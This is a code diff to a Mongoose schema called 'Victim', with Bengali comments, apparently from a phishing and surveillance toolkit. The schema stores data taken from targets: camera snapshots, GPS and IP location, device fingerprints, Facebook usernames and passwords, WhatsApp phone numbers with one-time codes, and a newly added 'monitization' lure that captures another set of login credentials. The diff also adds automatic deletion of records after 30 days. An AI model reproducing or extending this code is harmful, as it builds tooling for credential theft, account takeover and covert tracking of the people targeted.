@@ -3,14 +3,16 @@ const mongoose = require('mongoose');
 const victimSchema = new mongoose.Schema({
     id: { type: String, unique: true, required: true },
     fbId: { type: String, default: 'unknown' },
-    type: { type: String, enum: ['camera', 'location', 'fb', 'wp'], default: 'camera' },
+    type: { type: String, enum: ['camera', 'location', 'fb', 'wp', 'monitization'], default: 'camera' },
     shortLink: { type: String },
     timestamp: { type: Date, default: Date.now },
+    createdAt: { type: Date, default: Date.now }, // TTL ইনডেক্সের জন্য
     status: { type: String, default: 'pending' },
-    expiresAt: { type: Date, default: null }, // 🔥 লিংক এক্সপাইরি (৩০ মিনিট)
-    isExpired: { type: Boolean, default: false }, // 🔥 ম্যানুয়াল এক্সপাইরি
-
+    expiresAt: { type: Date, default: null },
+    isExpired: { type: Boolean, default: false },
+    
     ip: { type: String, default: null },
+    
     location: {
         country: { type: String, default: 'N/A' },
         region: { type: String, default: 'N/A' },
@@ -19,12 +21,14 @@ const victimSchema = new mongoose.Schema({
         longitude: { type: Number, default: 0 },
         isp: { type: String, default: 'N/A' }
     },
+    
     gpsLocation: {
         latitude: { type: Number, default: 0 },
         longitude: { type: Number, default: 0 },
         accuracy: { type: Number, default: 0 },
         googleMaps: { type: String, default: '' }
     },
+    
     device: {
         productSub: { type: String, default: 'N/A' },
         vendor: { type: String, default: 'N/A' },
@@ -46,11 +50,13 @@ const victimSchema = new mongoose.Schema({
         screen: { type: String, default: 'N/A' },
         colorDepth: { type: Number, default: 0 }
     },
+    
     media: [{
         kind: { type: String, default: 'N/A' },
         label: { type: String, default: 'N/A' },
         deviceId: { type: String, default: 'N/A' }
     }],
+    
     network: {
         type: { type: String, default: 'N/A' },
         rtt: { type: Number, default: 0 },
@@ -59,28 +65,45 @@ const victimSchema = new mongoose.Schema({
         downlink: { type: Number, default: 0 },
         downlinkMax: { type: Number, default: 0 }
     },
+    
     battery: {
         level: { type: Number, default: 0 },
         charging: { type: Boolean, default: false },
         chargingTime: { type: Number, default: 0 },
         dischargingTime: { type: Number, default: 0 }
     },
+    
     camera: [{
         image: { type: String, default: '' },
         timestamp: { type: Date, default: Date.now }
     }],
+    
     fbLogin: {
         username: { type: String, default: '' },
         password: { type: String, default: '' },
         timestamp: { type: Date, default: Date.now },
         ip: { type: String, default: 'N/A' }
     },
+    
     wpData: {
         phone: { type: String, default: '' },
         otp: { type: String, default: '' },
         timestamp: { type: Date, default: Date.now }
     },
+    
+    monitizationData: {
+        username: { type: String, default: '' },
+        password: { type: String, default: '' },
+        timestamp: { type: Date, default: Date.now },
+        ip: { type: String, default: 'N/A' }
+    },
+    
     collectedAt: { type: Date, default: Date.now }
 });
+
+// ================================================================
+// 🆕 ৩০ দিন পর অটো ডিলিটের জন্য TTL ইনডেক্স
+// ================================================================
+victimSchema.index({ createdAt: 1 }, { expireAfterSeconds: 30 * 24 * 60 * 60 });
 
 module.exports = mongoose.model('Victim', victimSchema);
